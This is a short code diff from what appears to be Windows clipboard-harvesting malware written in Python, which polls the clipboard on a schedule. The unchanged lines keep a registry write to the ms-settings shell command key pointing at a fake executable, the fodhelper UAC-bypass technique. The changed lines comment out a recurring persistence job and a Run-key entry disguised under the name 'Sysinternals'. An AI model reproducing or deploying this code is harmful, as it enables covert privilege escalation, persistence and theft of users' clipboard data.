@@ -19,7 +19,7 @@ def main():
     schedule.every(90).seconds.do(get_clipboard_info)
 
     #Reestablishes the persistence mechanisms
-    schedule.every(45).seconds.do(reestablish)
+    #schedule.every(45).seconds.do(reestablish)
 
     #Adds a hotkey, can't have parenthesis because it returns as a none type instead of a boolean
     #explore the timeout feature to add some more functionality
@@ -177,20 +177,21 @@ def establish():
     cmd3 = ["powershell", "-Command", "Set-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
             "-Value", "C:\\Windows\\System32\\clipboard_copy_test.exe", "-Force"]
 
-    cmd5 = ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Sysinternals", "/t",
-            "REG_SZ", "/d", "C:\\Windows\\System32\\fodhelper.exe"]
+    #cmd5 = ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Sysinternals", "/t",
+    #        "REG_SZ", "/d", "C:\\Windows\\System32\\fodhelper.exe"]
 
-    cmd_check = ["powershell", "-Command", "Get-ItemProperty", "-Path",
-                 "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "-Name",
-                 "Sysinternals", "-ErrorAction", "SilentlyContinue"]
+    #cmd_check = ["powershell", "-Command", "Get-ItemProperty", "-Path",
+    #             "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "-Name",
+    #             "Sysinternals", "-ErrorAction", "SilentlyContinue"]
 
     subprocess.run(cmd)
     subprocess.run(cmd2)
     subprocess.run(cmd3)
 
     #Checks the runkey does not exist
-    if not subprocess.run(cmd_check):
-        subprocess.run(cmd5)
+    #if not subprocess.run(cmd_check):
+    #subprocess.run(cmd5)
+
 
 #runs establish and then starts the main prorgam
 establish()
